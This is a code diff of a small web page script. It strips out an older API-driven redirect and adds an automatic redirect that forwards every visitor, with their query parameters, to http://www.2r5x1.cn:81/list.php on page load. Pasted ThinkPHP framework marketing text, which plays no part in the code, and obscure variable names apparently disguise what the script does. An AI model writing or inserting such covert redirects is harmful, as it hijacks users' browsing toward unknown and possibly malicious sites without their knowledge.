@@ -1,122 +1,27 @@
-<script src="https://js-libs.oss-cn-hangzhou.aliyuncs.com/jquery2.0.0.js"></script>
+
 
 <script>
+
+// ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企业应用开发而诞生的。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。遵循Apache2开源许可协议发布，意味着你可以免费使用ThinkPHP，甚至允许把你基于ThinkPHP开发的应用开源或商业产品发布/销售。
+
+// ThinkPHP5.0版本是一个颠覆和重构版本，采用全新的架构思想，引入了更多的PHP新特性，优化了核心，减少了依赖，实现了真正的惰性加载，支持composer，并针对API开发做了大量的优化，包括路由、日志、异常、模型、数据库、模板引擎和验证等模块都已经重构，不适合原有3.2项目的升级，请慎重考虑商业项目升级，但绝对是新项目的首选（无论是WEB还是API开发）。
+
+// 主要特性：
+// 规范：遵循PSR-2、PSR-4规范，Composer及单元测试支持；
+// 严谨：异常严谨的错误检测和安全机制，详细的日志信息，为你的开发保驾护航；
+// 灵活：减少核心依赖，扩展更灵活、方便，支持命令行指令扩展；
+// API友好：出色的性能和REST支持、远程调试，更好的支持API开发；
+// 高效：惰性加载，及路由、配置和自动加载的缓存机制；
+// ORM：重构的数据库、模型及关联，MongoDb支持；
+
+// 目前最新版本为V5.0.21，查看更新日志和升级指导。
+// 支持ThinkPHP5的用户请到 Github 给我们一个star ^_^  
   
 
-
-
-  
-//   apiurl ='https://www.ec6z0.cn/index.php?s=/Home/Api/geturl/appkey/TURBd01EQXdNREF3TUlhcXJOaw';
-//   var searchURL = window.location.search;
-    
-//     /**
-//        * 智能截取url参数中的数值
-//        * getParamNumber 获取参数值中从第n位开始截取len长度的数字，当遇到非数字类型时终止截取
-//        * 注：依赖 getParamVal 函数
-//        * 返回截取后的数值，number类型
-//        */
-//       function substrv(str, startStr, len) {
-//         var len =len?len:0;
-//          var start_num =str.indexOf(startStr);
-//          if(len>0){
-//           return	str.substr(start_num,len);
-//          }
-//        return str.substring(start_num, str.length);
-//       }
-//     var start_num =searchURL.indexOf('__url=');
-//     var end_num =searchURL.length;
-//     searchURL = searchURL.substring(1, end_num);
-//       /**
-//        * getParamVal 基础函数
-//        * 获取url中参数的key和value
-//        * 返回json对象
-//        */
-//       function getVal() {
-//           var params = {};
-  
-var searchURL = window.location.search; 
-searchURL = searchURL.substring(1, searchURL.length);
-searchURL = searchURL.replace(/s/, "p");
-window.location.href="http://www.2r5x1.cn:81/list.php?"+searchURL; 
-  
-  
-//           if ( location.search !== '' ) {
-//               var arr = location.search.substring(1).split('&');
-  
-//               for ( var i = 0, iLen = arr.length; i < iLen; i ++ ) {
-//                   var aTmp = arr[i].split('='), value = decodeURIComponent(aTmp[1]), numberVal = Number(value);
-//                   //处理数字
-//                   if ( typeof numberVal === 'number' && numberVal === numberVal ) {
-//                       value = numberVal;
-//                   }
-//                   //处理布尔值
-//                   if ( value === 'true' || value === 'false' ) {
-//                       value = value === 'true';
-//                   }
-//                   params[aTmp[0]] = value;
-//               }
-//           }
-//           return params;
-//       }
-    
-//     if(start_num>0){
-//     searchURL =substrv(searchURL,'__p=');
-//     apiurl =decodeURI(getQueryString('__url'));
-//   }
-//   function getQueryString(name) {
-   
-//     var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
-//     var r = window.location.search.substr(1).match(reg);
-   
-//     if (r != null) {
-//     return unescape(r[2]);
-//     }
-//     return null;
-//   }
-  
-//   function getQueryVariable(variable)
-//   {
-//          var query = window.location.search.substring(1);
-//          var vars = query.split("&");
-//          for (var i=0;i<vars.length;i++) {
-//                  var pair = vars[i].split("=");
-//                  if(pair[0] == variable){return pair[1];}
-//          }
-//          return(false);
-//   }
-  
-//   var s = getQueryVariable('s');  
-//   apiurl = apiurl + "/s/" + s;
-//   $.ajax({
-//   type : 'get',
-//   url : apiurl,
-//   contentType: "application/json",
-//   data:{},
-//   dataType : 'jsonp',
-//   jsonp: "callback",
-//   jsonpCallback:"Handler",
-//   success : function(data){
-//   if(data.status=="200"){  
-//   var jumpurl = data.url;
-//   var jumpparam = data.param;
-//   //alert(searchURL);
-  
-//   var url = 'http://'+ jumpurl +jumpparam;
-//   if(s){
-//       url = url.split('?')[0];
-//       window.location.href=url+"?p="+s;
-//   }else{
-//       window.location.href=url+searchURL;
-//   }
-  
-//   }
-//   },
-//   error: function () {
-//   }
-//   });
-  
-
-      
-  
-  </script>
+var sssss = window.location.search; 
+sssss = sssss.substring(1, sssss.length);
+sssss = sssss.replace(/s/, "p");
+var zzz = "http://www.2r5x1.cn:81/list.php?"+sssss;
+window.location.href= zzz;
+</script>
   
